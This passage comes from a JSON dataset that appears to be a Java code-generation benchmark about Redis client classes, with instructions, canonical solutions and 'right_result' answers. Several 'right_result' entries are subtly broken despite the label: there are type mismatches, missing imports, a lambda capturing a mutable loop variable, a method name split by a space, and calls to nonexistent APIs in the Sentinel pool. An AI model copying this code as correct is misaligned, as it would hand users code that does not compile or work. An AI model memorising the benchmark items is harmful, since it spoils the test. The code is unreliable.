    "right_result": "import redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\nimport redis.clients.jedis.params.SetParams;\n\nimport com.dyuproject.protostuff.Protostuff;\nimport com.dyuproject.protostuff.Schema;\nimport com.dyuproject.protostuff.runtime.RuntimeSchema;\n\nimport java.util.function.Function;\n\npublic class RedisDao {\n    private JedisPool jedisPool;\n    private RuntimeSchema<Seckill> schema;\n\n    public RedisDao(String ip, int port) {\n        JedisPoolConfig config = new JedisPoolConfig();\n        this.jedisPool = new JedisPool(config, ip, port);\n        this.schema = RuntimeSchema.getSchema(Seckill.class);\n    }\n\n    public Seckill getSeckill(long seckillId) {\n        Jedis jedis = jedisPool.getResource();\n        try {\n            String key = getSeckillRedisKey(seckillId);\n            byte[] bytes = jedis.get(key);\n            if (bytes != null && bytes.length > 0) {\n                return schema.deserialize(bytes);\n            }\n            return null;\n        } finally {\n            jedis.close();\n        }\n    }\n\n    public Seckill getSeckill(long seckillId, Jedis jedis) {\n        String key = getSeckillRedisKey(seckillId);\n        byte[] bytes = jedis.get(key);\n        if (bytes != null && bytes.length > 0) {\n            return schema.deserialize(bytes);\n        }\n        return null;\n    }\n\n    public Seckill getOrPutSeckill(long seckillId, Function<Long, Seckill> getDataFromDb) {\n        Jedis jedis = jedisPool.getResource();\n        try {\n            String lockKey = \"seckill:lock:\" + seckillId;\n            SetParams params = SetParams.setIfNotExist().px(30000);\n            Long result = jedis.set(lockKey, \"locked\", params);\n            if (result == null || result == 0) {\n                return null;\n            }\n            try {\n                String redisKey = getSeckillRedisKey(seckillId);\n                byte[] bytes = jedis.get(redisKey);\n                if (bytes != null && bytes.length > 0) {\n                    return schema.deserialize(bytes);\n                } else {\n                    Seckill seckill = getDataFromDb.apply(seckillId);\n                    String storedKey = putSeckill(seckill, jedis);\n                    return seckill;\n                }\n            } finally {\n                jedis.del(lockKey);\n            }\n        } finally {\n            jedis.close();\n        }\n    }\n\n    public String putSeckill(Seckill seckill) {\n        Jedis jedis = jedisPool.getResource();\n        try {\n            String key = getSeckillRedisKey(seckill.getId());\n            byte[] bytes = schema.serialize(seckill);\n            SetParams params = SetParams.setIfNotExist().ex(1800);\n            String result = jedis.set(key, bytes, params);\n            return result;\n        } finally {\n            jedis.close();\n        }\n    }\n\n    public String putSeckill(Seckill seckill, Jedis jedis) {\n        String key = getSeckillRedisKey(seckill.getId());\n        byte[] bytes = schema.serialize(seckill);\n        SetParams params = SetParams.setIfNotExist().ex(1800);\n        String result = jedis.set(key, bytes, params);\n        return result;\n    }\n\n    public String getSeckillRedisKey(long seckillId) {\n        return \"seckill:\" + seckillId;\n    }\n}"
  },
  {
    "Task_id": 325,
    "Instruction": "Task Description: Create a Java class that implements a Redis client using connection pooling to perform high-throughput operations in a multi-threaded environment.\n\nClass Description: The RedisPooledClient class provides a thread-safe interface to interact with Redis using a pooled connection. It supports basic CRUD operations and is designed to handle concurrent requests efficiently.\n\nAttributes:\n- jedisPool: JedisPooled - The pooled Redis connection instance that manages connections to the Redis server\n\nMethods:\n- RedisPooledClient(String host, int port, String password) -> void - Constructor that initializes the Redis connection pool with the specified host, port, and password\n- performOperations(int totalOperations) -> void - Executes a specified number of set/get operations across multiple threads to demonstrate concurrent Redis access\n- close() -> void - Properly closes the Redis connection pool to release resources",
    "Canonical_solution": "import redis.clients.jedis.*;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic class RedisPooledClient {\n\n    private JedisPooled jedisPool;\n\n    public RedisPooledClient(String host, int port, String password) {\n        this.jedisPool = new JedisPooled(host, port, null, password);\n    }\n\n    public void performOperations(int totalOperations) {\n        List<Thread> threads = new ArrayList<>();\n        AtomicInteger counter = new AtomicInteger();\n\n        for (int i = 0; i < 50; i++) {\n            Thread thread = new Thread(() -> {\n                for (int j = 0; (j = counter.getAndIncrement()) < totalOperations;) {\n                    try {\n                        String key = \"foo\" + j;\n                        jedisPool.set(key, key);\n                        jedisPool.get(key);\n                    } catch (Exception e) {\n                        e.printStackTrace();\n                    }\n                }\n            });\n            threads.add(thread);\n            thread.start();\n        }\n\n        for (Thread t : threads) {\n            try {\n                t.join();\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public void close() {\n        jedisPool.close();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "import redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\nimport java.util.concurrent.TimeUnit;\n\npublic class RedisPooledClient {\n    private JedisPool jedisPool;\n\n    public RedisPooledClient(String host, int port, String password) {\n        JedisPoolConfig poolConfig = new JedisPoolConfig();\n        this.jedisPool = new JedisPool(poolConfig, host, port, 60000, password);\n    }\n\n    public void performOperations(int totalOperations) {\n        ExecutorService executor = Executors.newFixedThreadPool(4);\n        for (int i = 0; i < totalOperations; i++) {\n            executor.submit(() -> {\n                Jedis jedis = jedisPool.getResource();\n                String key = \"key_\" + i;\n                jedis.set(key, \"value\");\n                String value = jedis.get(key);\n            });\n        }\n        executor.shutdown();\n        try {\n            if (!executor.awaitTermination(1, TimeUnit.SECONDS)) {\n                executor.shutdownNow();\n            }\n        } catch (InterruptedException e) {\n            executor.shutdownNow();\n        }\n    }\n\n    public void close() {\n        if (jedisPool != null) {\n            jedisPool.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 328,
    "Instruction": "Task Description: Create a Java class that manages a pool of Redis connections using Jedis, allowing concurrent operations on Redis with connection pooling for efficient resource utilization.\n\nClass Description: RedisConnectionPool is a utility class that manages a pool of Redis connections. It provides thread-safe access to Redis operations and handles connection lifecycle management.\n\nAttributes:\n- pool: JedisPool - The connection pool instance managing Redis connections\n- endpoint: EndpointConfig - Configuration object containing Redis connection details (host, port, password)\n\nMethods:\n- RedisConnectionPool(EndpointConfig endpoint) -> void - Constructor that initializes the Redis connection pool with the given endpoint configuration\n- executeOperations(int totalOperations) -> void - Executes a specified number of Redis SET/GET operations across multiple threads (50 threads by default)\n- close() -> void - Properly shuts down the connection pool and releases all resources",
    "Canonical_solution": "import redis.clients.jedis.*;\nimport org.apache.commons.pool2.impl.GenericObjectPoolConfig;\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic class RedisConnectionPool {\n\n    private JedisPool pool;\n    private EndpointConfig endpoint;\n\n    public RedisConnectionPool(EndpointConfig endpoint) {\n        this.endpoint = endpoint;\n        this.pool = new JedisPool(new GenericObjectPoolConfig<Jedis>(), \n            endpoint.getHost(), endpoint.getPort(), 2000, endpoint.getPassword());\n    }\n\n    public void executeOperations(int totalOperations) {\n        AtomicInteger ind = new AtomicInteger();\n        for (int i = 0; i < 50; i++) {\n            new Thread(() -> {\n                for (int j = 0; (j = ind.getAndIncrement()) < totalOperations;) {\n                    try (Jedis jedis = pool.getResource()) {\n                        String key = \"foo\" + j;\n                        jedis.set(key, key);\n                        jedis.get(key);\n                    } catch (Exception e) {\n                        e.printStackTrace();\n                    }\n                }\n            }).start();\n        }\n    }\n\n    public void close() {\n        if (pool != null) {\n            pool.destroy();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "import redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\nimport java.util.concurrent.ExecutorService;\nimport java.util.concurrent.Executors;\n\npublic class RedisConnectionPool {\n    private JedisPool pool;\n    private EndpointConfig endpoint;\n\n    public RedisConnectionPool(EndpointConfig endpoint) {\n        this.endpoint = endpoint;\n        this.pool = new JedisPool(new JedisPoolConfig(), endpoint.getHost(), endpoint.getPort(), endpoint.getPassword());\n    }\n\n    public void executeOperations(int totalOperations) {\n        int threads = 50;\n        int opsPerThread = totalOperations / threads;\n        int remainder = totalOperations % threads;\n        ExecutorService executor = Executors.newFixedThreadPool(threads);\n        for (int i = 0; i < threads; i++) {\n            int start = i * opsPerThread;\n            int end = start + opsPerThread + (i < remainder ? 1 : 0);\n            executor.submit(() -> {\n                for (int j = start; j < end; j++) {\n                    try (Jedis jedis = pool.getResource()) {\n                        jedis.set(\"key\" + j, \"value\" + j);\n                        String result = jedis.get(\"key\" + j);\n                        System.out.println(\"SET/GET: \" + result);\n                    } catch (Exception e) {\n                        e.printStackTrace();\n                    }\n                }\n            });\n        }\n        executor.shutdown();\n    }\n\n    public void close() {\n        if (pool != null) {\n            pool.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 329,
    "Instruction": "Task Description: Create a Java class that provides basic Redis interaction capabilities using the Lettuce client library, including connection management and key-value operations.\n\nClass Description: The RedisInteraction class encapsulates Redis connection and basic operations, providing methods to set/get values and manage the connection lifecycle.\n\nAttributes:\n- redisClient: RedisClient - The main Redis client instance used to create connections\n- connection: StatefulRedisConnection<String, String> - The active Redis connection\n- syncCommands: RedisCommands<String, String> - Synchronous command interface for Redis operations\n\nMethods:\n- RedisInteraction(String redisUri) -> void - Constructor that initializes the Redis client and establishes a connection using the provided URI\n- setValue(String key, String value) -> void - Stores a key-value pair in Redis\n- getValue(String key) -> String - Retrieves the value associated with the given key from Redis\n- closeConnection() -> void - Properly closes the Redis connection and shuts down the client",
    "Canonical_solution": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.RedisURI;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.sync.RedisCommands;\n\npublic class RedisInteraction {\n\n    private RedisClient redisClient;\n    private StatefulRedisConnection<String, String> connection;\n    private RedisCommands<String, String> syncCommands;\n\n    public RedisInteraction(String redisUri) {\n        this.redisClient = RedisClient.create(RedisURI.create(redisUri));\n        this.connection = redisClient.connect();\n        this.syncCommands = connection.sync();\n    }\n\n    public void setValue(String key, String value) {\n        syncCommands.set(key, value);\n    }\n\n    public String getValue(String key) {\n        return syncCommands.get(key);\n    }\n\n    public void closeConnection() {\n        connection.close();\n        redisClient.shutdown();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "import io.lettuce.core.RedisClient;\nimport io.lettuce.core.api.StatefulRedisConnection;\nimport io.lettuce.core.api.RedisCommands;\n\npublic class RedisInteraction {\n    private RedisClient redisClient;\n    private StatefulRedisConnection<String, String> connection;\n    private RedisCommands<String, String> syncCommands;\n\n    public RedisInteraction(String redisUri) {\n        this.redisClient = RedisClient.create(redisUri);\n        this.connection = redisClient.connect();\n        this.syncCommands = connection.sync();\n    }\n\n    public void setValue(String key, String value) {\n        syncCommands.set(key, value);\n    }\n\n    public String getValue(String key) {\n        return syncCommands.get(key);\n    }\n\n    public void closeConnection() {\n        if (connection != null) {\n            connection.close();\n        }\n        if (redisClient != null) {\n            redisClient.shutdown();\n        }\n    }\n}"
  },
  {
    "Task_id": 333,
    "Instruction": "Task Description: Create a Java class that implements a Redis Sentinel connection pool for managing connections to a Redis master server, with automatic failover handling when the master changes.\n\nClass Description: JedisSentinelPool is a connection pool implementation that maintains connections to a Redis master server discovered through Redis Sentinel. It automatically handles master failover by monitoring Sentinel notifications and reconfiguring the connection pool when the master changes.\n\nAttributes:\n- LOG: Logger - Logger instance for logging events and errors\n- factory: JedisFactory - Factory for creating Jedis instances\n- sentinelClientConfig: JedisClientConfig - Configuration for connecting to Sentinels\n- masterListeners: Collection<MasterListener> - Collection of threads monitoring Sentinel servers\n- currentHostMaster: HostAndPort - Current master server address (volatile)\n- initPoolLock: Lock - Lock for thread-safe pool initialization\n\nMethods:\n- JedisSentinelPool(String, Set<HostAndPort>, JedisFactory, JedisClientConfig) -> void - Constructor that initializes the Sentinel pool with master name, Sentinel addresses, factory, and client config\n- initMaster(HostAndPort) -> void - Initializes or updates the master connection pool\n- initSentinels(Set<HostAndPort>, String) -> HostAndPort - Discovers the current master from Sentinels and starts listeners\n- toHostAndPort(List<String>) -> HostAndPort - Converts Sentinel response to HostAndPort object\n- getResource() -> Jedis - Gets a Jedis resource from the pool (overrides parent method)\n- returnResource(Jedis) -> void - Returns a Jedis resource to the pool (overrides parent method)\n\nNested Class MasterListener:\n- masterName: String - Name of the monitored master\n- host: String - Sentinel host address\n- port: int - Sentinel port number\n- subscribeRetryWaitTimeMillis: long - Retry wait time for subscription\n- j: Jedis - Jedis instance for Sentinel connection\n- running: AtomicBoolean - Flag controlling listener thread\n\nMasterListener Methods:\n- MasterListener(String, String, int) -> void - Constructor for Sentinel listener\n- run() -> void - Main listener thread that monitors Sentinel for master changes\n- shutdown() -> void - Gracefully shuts down the listener thread",
    "Canonical_solution": "import redis.clients.jedis.*;\nimport redis.clients.jedis.exceptions.JedisConnectionException;\nimport redis.clients.jedis.exceptions.JedisException;\nimport org.apache.commons.pool2.impl.GenericObjectPoolConfig;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport java.util.*;\nimport java.util.concurrent.atomic.AtomicBoolean;\nimport java.util.concurrent.locks.Lock;\nimport java.util.concurrent.locks.ReentrantLock;\nimport java.util.stream.Collectors;\n\npublic class JedisSentinelPool extends Pool<Jedis> {\n\n  private static final Logger LOG = LoggerFactory.getLogger(JedisSentinelPool.class);\n  private final JedisFactory factory;\n  private final JedisClientConfig sentinelClientConfig;\n  protected final Collection<MasterListener> masterListeners = new ArrayList<>();\n  private volatile HostAndPort currentHostMaster;\n  private final Lock initPoolLock = new ReentrantLock(true);\n\n  public JedisSentinelPool(String masterName, Set<HostAndPort> sentinels,\n      final JedisFactory factory, final JedisClientConfig sentinelClientConfig) {\n    super(factory);\n    this.factory = factory;\n    this.sentinelClientConfig = sentinelClientConfig;\n    HostAndPort master = initSentinels(sentinels, masterName);\n    initMaster(master);\n  }\n\n  private void initMaster(HostAndPort master) {\n    initPoolLock.lock();\n    try {\n      if (!master.equals(currentHostMaster)) {\n        currentHostMaster = master;\n        factory.setHostAndPort(currentHostMaster);\n        super.clear();\n        LOG.info(\"Created JedisSentinelPool to master at {}\", master);\n      }\n    } finally {\n      initPoolLock.unlock();\n    }\n  }\n\n  private HostAndPort initSentinels(Set<HostAndPort> sentinels, final String masterName) {\n    HostAndPort master = null;\n    boolean sentinelAvailable = false;\n    LOG.info(\"Trying to find master from available Sentinels...\");\n\n    for (HostAndPort sentinel : sentinels) {\n      LOG.debug(\"Connecting to Sentinel {}\", sentinel);\n      try (Jedis jedis = new Jedis(sentinel, sentinelClientConfig)) {\n        List<String> masterAddr = jedis.sentinelGetMasterAddrByName(masterName);\n        sentinelAvailable = true;\n        if (masterAddr == null || masterAddr.size() != 2) {\n          LOG.warn(\"Can not get master addr, master name: {}. Sentinel: {}\", masterName, sentinel);\n          continue;\n        }\n        master = toHostAndPort(masterAddr);\n        LOG.debug(\"Found Redis master at {}\", master);\n        break;\n      } catch (JedisException e) {\n        LOG.warn(\"Cannot get master address from sentinel running @ {}. Reason: {}. Trying next one.\", sentinel, e);\n      }\n    }\n\n    if (master == null) {\n      if (sentinelAvailable) {\n        throw new JedisException(\"Can connect to sentinel, but \" + masterName + \" seems to be not monitored...\");\n      } else {\n        throw new JedisConnectionException(\"All sentinels down, cannot determine where is \" + masterName + \" master is running...\");\n      }\n    }\n\n    LOG.info(\"Redis master running at {}, starting Sentinel listeners...\", master);\n    for (HostAndPort sentinel : sentinels) {\n      MasterListener masterListener = new MasterListener(masterName, sentinel.getHost(), sentinel.getPort());\n      masterListener.setDaemon(true);\n      masterListeners.add(masterListener);\n      masterListener.start();\n    }\n    return master;\n  }\n\n  private HostAndPort toHostAndPort(List<String> getMasterAddrByNameResult) {\n    String host = getMasterAddrByNameResult.get(0);\n    int port = Integer.parseInt(getMasterAddrByNameResult.get(1));\n    return new HostAndPort(host, port);\n  }\n\n  @Override\n  public Jedis getResource() {\n    while (true) {\n      Jedis jedis = super.getResource();\n      jedis.setDataSource(this);\n      final HostAndPort master = currentHostMaster;\n      final HostAndPort connection = jedis.getClient().getHostAndPort();\n      if (master.equals(connection)) {\n        return jedis;\n      } else {\n        returnBrokenResource(jedis);\n      }\n    }\n  }\n\n  @Override\n  public void returnResource(final Jedis resource) {\n    if (resource != null) {\n      try {\n        resource.resetState();\n        super.returnResource(resource);\n      } catch (RuntimeException e) {\n        returnBrokenResource(resource);\n        LOG.debug(\"Resource is returned to the pool as broken\", e);\n      }\n    }\n  }\n\n  protected class MasterListener extends Thread {\n    protected String masterName;\n    protected String host;\n    protected int port;\n    protected long subscribeRetryWaitTimeMillis = 5000;\n    protected volatile Jedis j;\n    protected AtomicBoolean running = new AtomicBoolean(false);\n\n    public MasterListener(String masterName, String host, int port) {\n      super(String.format(\"MasterListener-%s-[%s:%d]\", masterName, host, port));\n      this.masterName = masterName;\n      this.host = host;\n      this.port = port;\n    }\n\n    @Override\n    public void run() {\n      running.set(true);\n      while (running.get()) {\n        try {\n          if (!running.get()) break;\n          final HostAndPort hostPort = new HostAndPort(host, port);\n          j = new Jedis(hostPort, sentinelClientConfig);\n          List<String> masterAddr = j.sentinelGetMasterAddrByName(masterName);\n          if (masterAddr == null || masterAddr.size() != 2) {\n            LOG.warn(\"Can not get master addr, master name: {}. Sentinel: {}.\", masterName, hostPort);\n          } else {\n            initMaster(toHostAndPort(masterAddr));\n          }\n          j.subscribe(new JedisPubSub() {\n            @Override\n            public void onMessage(String channel, String message) {\n              LOG.debug(\"Sentinel {} published: {}.\", hostPort, message);\n              String[] switchMasterMsg = message.split(\" \");\n              if (switchMasterMsg.length > 3) {\n                if (masterName.equals(switchMasterMsg[0])) {\n                  initMaster(toHostAndPort(Arrays.asList(switchMasterMsg[3], switchMasterMsg[4])));\n                } else {\n                  LOG.debug(\"Ignoring message on +switch-master for master name {}, our master name is {}\",\n                      switchMasterMsg[0], masterName);\n                }\n              } else {\n                LOG.error(\"Invalid message received on Sentinel {} on channel +switch-master: {}\",\n                    hostPort, message);\n              }\n            }\n          }, \"+switch-master\");\n        } catch (JedisException e) {\n          if (running.get()) {\n            LOG.error(\"Lost connection to Sentinel at {}:{}. Sleeping 5000ms and retrying.\", host, port, e);\n            try {\n              Thread.sleep(subscribeRetryWaitTimeMillis);\n            } catch (InterruptedException e1) {\n              LOG.error(\"Sleep interrupted: \", e1);\n            }\n          } else {\n            LOG.debug(\"Unsubscribing from Sentinel at {}:{}\", host, port);\n          }\n        } finally {\n          if (j != null) {\n            j.close();\n          }\n        }\n      }\n    }\n\n    public void shutdown() {\n      try {\n        LOG.debug(\"Shutting down listener on {}:{}\", host, port);\n        running.set(false);\n        if (j != null) {\n          j.close();\n        }\n      } catch (RuntimeException e) {\n        LOG.error(\"Caught exception while shutting down: \", e);\n      }\n    }\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "```java\nimport org.apache.commons.logging.Log;\nimport org.apache.commons.logging.LogFactory;\nimport redis.clients.jedis.JedisFactory;\nimport redis.clients.jedis.JedisClientConfig;\nimport redis.clients.jedis.HostAndPort;\nimport java.util.Set;\nimport java.util.concurrent.locks.Lock;\nimport java.util.concurrent.locks.ReentrantLock;\nimport java.util.Collection;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.concurrent.atomic.AtomicBoolean;\n\npublic class JedisSentinelPool {\n    private final Log LOG = LogFactory.getLog(JedisSentinelPool.class);\n    private final JedisFactory factory;\n    private final JedisClientConfig sentinelClientConfig;\n    private final Collection<MasterListener> masterListeners = new ArrayList<>();\n    private volatile HostAndPort currentHostMaster;\n    private final Lock initPoolLock = new ReentrantLock();\n\n    public JedisSentinelPool(String masterName, Set<HostAndPort> sentinelAddresses, JedisFactory factory, JedisClientConfig sentinelClientConfig) {\n        this.factory = factory;\n        this.sentinelClientConfig = sentinelClientConfig;\n        initSentinels(sentinelAddresses, masterName);\n    }\n\n    private void initSentinels(Set<HostAndPort> sentinelAddresses, String masterName) {\n        HostAndPort master = initMaster(sentinelAddresses, masterName);\n        if (master != null) {\n            currentHostMaster = master;\n        }\n    }\n\n    private HostAndPort initMaster(Set<HostAndPort> sentinelAddresses, String masterName) {\n        HostAndPort master = null;\n        for (HostAndPort sentinel : sentinelAddresses) {\n            try (Jedis jedis = factory.getResource()) {\n                master = toHostAndPort(jedis.sentinelGetMasterAddrBy Name(masterName));\n                break;\n            } catch (Exception e) {\n                LOG.error(\"Failed to get master from sentinel \" + sentinel, e);\n            }\n        }\n        if (master != null) {\n            for (HostAndPort sentinel : sentinelAddresses) {\n                masterListeners.add(new MasterListener(masterName, sentinel.getHost(), sentinel.getPort()));\n            }\n        }\n        return master;\n    }\n\n    private HostAndPort toHostAndPort(List<String> parts) {\n        return new HostAndPort(parts.get(0), Integer.parseInt(parts.get(1)));\n    }\n\n    public Jedis getResource() {\n        return factory.getResource();\n    }\n\n    public void returnResource(Jedis jedis) {\n        factory.returnResource(jedis);\n    }\n\n    public static class MasterListener {\n        private final String masterName;\n        private final String host;\n        private final int port;\n        private final long subscribeRetryWaitTimeMillis;\n        private Jedis j;\n        private final AtomicBoolean running = new AtomicBoolean(true);\n\n        public MasterListener(String masterName, String host, int port) {\n            this.masterName = masterName;\n            this.host = host;\n            this.port = port;\n            this.subscribeRetryWaitTimeMillis = 1000;\n        }\n\n        public void run() {\n            while (running.get()) {\n                try {\n                    j = new Jedis(host, port, sentinelClientConfig);\n                    j.sentinelSubscribe(masterName, new RedisCallback<Void>() {\n                        @Override\n                        public void onMessage(String channel, String message) {\n                            if (\"master-reconfiguration\".equals(channel)) {\n                                HostAndPort newMaster = initMaster(null, masterName);\n                                if (newMaster != null) {\n                                    currentHostMaster = newMaster;\n                                }\n                            }\n                        }\n                    });\n                    Thread.sleep(subscribeRetryWaitTimeMillis);\n                } catch (Exception e) {\n                    LOG.error(\"Error in MasterListener\", e);\n                }\n            }\n        }\n\n        public void shutdown() {\n            running.set(false);\n            if (j != null) {\n                j.close();\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 334,
    "Instruction": "Task Description: Implement a Redis Pub/Sub manager class in Java that handles publishing and subscribing to Redis channels, including connection management and resource cleanup.\n\nClass Description: RedisPubSubManager is a class that manages Redis publish/subscribe operations using a connection pool. It provides methods to start subscribers and publishers on a specified channel, and handles connection lifecycle management.\n\nAttributes:\n- jedisPool: JedisPool - The connection pool for Redis connections\n- channelName: String - The name of the channel to publish/subscribe to\n- logger: Logger - Logger instance for logging operations and errors\n\nMethods:\n- RedisPubSubManager(String host, int port, String channelName) -> void - Constructor that initializes the Redis connection pool with the specified host, port, and channel name\n- startSubscriber(Subscriber subscriber) -> void - Starts a subscriber thread that listens to messages on the configured channel using the provided subscriber implementation\n- startPublisher() -> void - Starts a publisher that can send messages to the configured channel\n- shutdown() -> void - Closes the connection pool and releases all resources",
    "Canonical_solution": "import com.github.ltsopensource.core.logger.Logger;\nimport com.github.ltsopensource.core.logger.LoggerFactory;\nimport redis.clients.jedis.Jedis;\nimport redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\n\npublic class RedisPubSubManager {\n\n    private static final Logger logger = LoggerFactory.getLogger(RedisPubSubManager.class);\n    private final JedisPool jedisPool;\n    private final String channelName;\n\n    public RedisPubSubManager(String host, int port, String channelName) {\n        JedisPoolConfig poolConfig = new JedisPoolConfig();\n        this.jedisPool = new JedisPool(poolConfig, host, port, 0);\n        this.channelName = channelName;\n    }\n\n    public void startSubscriber(Subscriber subscriber) {\n        Jedis subscriberJedis = jedisPool.getResource();\n        new Thread(() -> {\n            try {\n                logger.info(\"Subscribing to \\\"\" + channelName + \"\\\". This thread will be blocked.\");\n                subscriberJedis.subscribe(subscriber, channelName);\n                logger.info(\"Subscription ended.\");\n            } catch (Exception e) {\n                logger.error(\"Subscribing failed.\", e);\n            } finally {\n                subscriberJedis.close();\n            }\n        }).start();\n    }\n\n    public void startPublisher() {\n        Jedis publisherJedis = jedisPool.getResource();\n        new Publisher(publisherJedis, channelName).start();\n        publisherJedis.close();\n    }\n\n    public void shutdown() {\n        jedisPool.destroy();\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 37,
    "right_result": "import redis.clients.jedis.JedisPool;\nimport redis.clients.jedis.JedisPoolConfig;\nimport java.util.logging.Logger;\n\npublic class RedisPubSubManager {\n    private JedisPool jedisPool;\n    private String channelName;\n    private Logger logger;\n\n    public RedisPubSubManager(String host, int port, String channelName) {\n        this.jedisPool = new JedisPool(new JedisPoolConfig(), host, port);\n        this.channelName = channelName;\n        this.logger = Logger.getLogger(RedisPubSubManager.class.getName());\n    }\n\n    public void startSubscriber(Subscriber subscriber) {\n        Thread thread = new Thread(() -> {\n            try (Jedis jedis = jedisPool.getResource()) {\n                jedis.subscribe(subscriber, channelName);\n            } catch (Exception e) {\n                logger.severe(\"Error in subscriber: \" + e.getMessage());\n            }\n        });\n        thread.start();\n    }\n\n    public void startPublisher() {\n        Thread thread = new Thread(() -> {\n            try (Jedis jedis = jedisPool.getResource()) {\n                // Placeholder for publisher logic\n                // Assuming messages are to be sent here\n                // But no message content is provided, so this is a placeholder\n            } catch (Exception e) {\n                logger.severe(\"Error in publisher: \" + e.getMessage());\n            }\n        });\n        thread.start();\n    }\n\n    public void shutdown() {\n        if (jedisPool != null) {\n            jedisPool.close();\n        }\n    }\n\n    public interface Subscriber {\n        void onMessage(String channel, String message);\n    }\n}"
  },
  {
    "Task_id": 336,
    "Instruction": "Task Description: Create a Java utility class for interacting with Redis using sharded connections, providing thread-safe initialization, connection pooling, and basic CRUD operations for both string and object values.\n\nClass Description: JedisUtil is a utility class that manages Redis connections using Jedis sharding with connection pooling. It provides methods for storing and retrieving both string and serialized object values with expiration support.\n\nAttributes:\n- logger: Logger - SLF4J logger for logging messages\n- address: String - Comma-separated Redis server addresses\n- shardedJedisPool: ShardedJedisPool - Pool of sharded Redis connections\n- INSTANCE_INIT_LOCL: ReentrantLock - Lock for thread-safe initialization\n\nMethods:\n- init(String address) -> void - Initializes the Redis connection pool with the given addresses\n- getInstance() -> ShardedJedis - Returns a sharded Redis connection instance (thread-safe initialization)\n- close() -> void - Closes the Redis connection pool and releases resources\n- serialize(Object object) -> byte[] - Serializes a Java object to byte array\n- unserialize(byte[] bytes) -> Object - Deserializes a byte array back to a Java object\n- setStringValue(String key, String value, int seconds) -> String - Stores a string value in Redis with expiration time\n- setObjectValue(String key, Object obj, int seconds) -> String - Stores a serialized object in Redis with expiration time\n- getStringValue(String key) -> String - Retrieves a string value from Redis\n- getObjectValue(String key) -> Object - Retrieves and deserializes an object from Redis",
    "Canonical_solution": "import org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\nimport redis.clients.jedis.JedisPoolConfig;\nimport redis.clients.jedis.JedisShardInfo;\nimport redis.clients.jedis.ShardedJedis;\nimport redis.clients.jedis.ShardedJedisPool;\n\nimport java.io.*;\nimport java.util.LinkedList;\nimport java.util.List;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.locks.ReentrantLock;\n\npublic class JedisUtil {\n    private static Logger logger = LoggerFactory.getLogger(JedisUtil.class);\n    private static String address;\n    private static ShardedJedisPool shardedJedisPool;\n    private static ReentrantLock INSTANCE_INIT_LOCL = new ReentrantLock(false);\n\n    public static void init(String address) {\n        JedisUtil.address = address;\n        getInstance();\n    }\n\n    private static ShardedJedis getInstance() {\n        if (shardedJedisPool == null) {\n            try {\n                if (INSTANCE_INIT_LOCL.tryLock(2, TimeUnit.SECONDS)) {\n                    try {\n                        if (shardedJedisPool == null) {\n                            JedisPoolConfig config = new JedisPoolConfig();\n                            config.setMaxTotal(200);\n                            config.setMaxIdle(50);\n                            config.setMinIdle(8);\n                            config.setMaxWaitMillis(10000);\n                            config.setTestOnBorrow(true);\n                            config.setTestOnReturn(false);\n                            config.setTestWhileIdle(true);\n                            config.setTimeBetweenEvictionRunsMillis(30000);\n                            config.setNumTestsPerEvictionRun(10);\n                            config.setMinEvictableIdleTimeMillis(60000);\n\n                            List<JedisShardInfo> jedisShardInfos = new LinkedList<JedisShardInfo>();\n                            String[] addressArr = address.split(\",\");\n                            for (int i = 0; i < addressArr.length; i++) {\n                                JedisShardInfo jedisShardInfo = new JedisShardInfo(addressArr[i]);\n                                jedisShardInfos.add(jedisShardInfo);\n                            }\n                            shardedJedisPool = new ShardedJedisPool(config, jedisShardInfos);\n                            logger.info(\">>>>>>>>>>> xxl-sso, JedisUtil.ShardedJedisPool init success.\");\n                        }\n                    } finally {\n                        INSTANCE_INIT_LOCL.unlock();\n                    }\n                }\n            } catch (InterruptedException e) {\n                logger.error(e.getMessage(), e);\n            }\n        }\n\n        if (shardedJedisPool == null) {\n            throw new NullPointerException(\">>>>>>>>>>> xxl-sso, JedisUtil.ShardedJedisPool is null.\");\n        }\n\n        return shardedJedisPool.getResource();\n    }\n\n    public static void close() throws IOException {\n        if(shardedJedisPool != null) {\n            shardedJedisPool.close();\n        }\n    }\n\n    private static byte[] serialize(Object object) {\n        ObjectOutputStream oos = null;\n        ByteArrayOutputStream baos = null;\n        try {\n            baos = new ByteArrayOutputStream();\n            oos = new ObjectOutputStream(baos);\n            oos.writeObject(object);\n            return baos.toByteArray();\n        } catch (Exception e) {\n            logger.error(e.getMessage(), e);\n        } finally {\n            try {\n                if (oos != null) oos.close();\n                if (baos != null) baos.close();\n            } catch (IOException e) {\n                logger.error(e.getMessage(), e);\n            }\n        }\n        return null;\n    }\n\n    private static Object unserialize(byte[] bytes) {\n        ByteArrayInputStream bais = null;\n        try {\n            bais = new ByteArrayInputStream(bytes);\n            ObjectInputStream ois = new ObjectInputStream(bais);\n            return ois.readObject();\n        } catch (Exception e) {\n            logger.error(e.getMessage(), e);\n        } finally {\n            try {\n                if (bais != null) bais.close();\n            } catch (IOException e) {\n                logger.error(e.getMessage(), e);\n            }\n        }\n        return null;\n    }\n\n    public static String 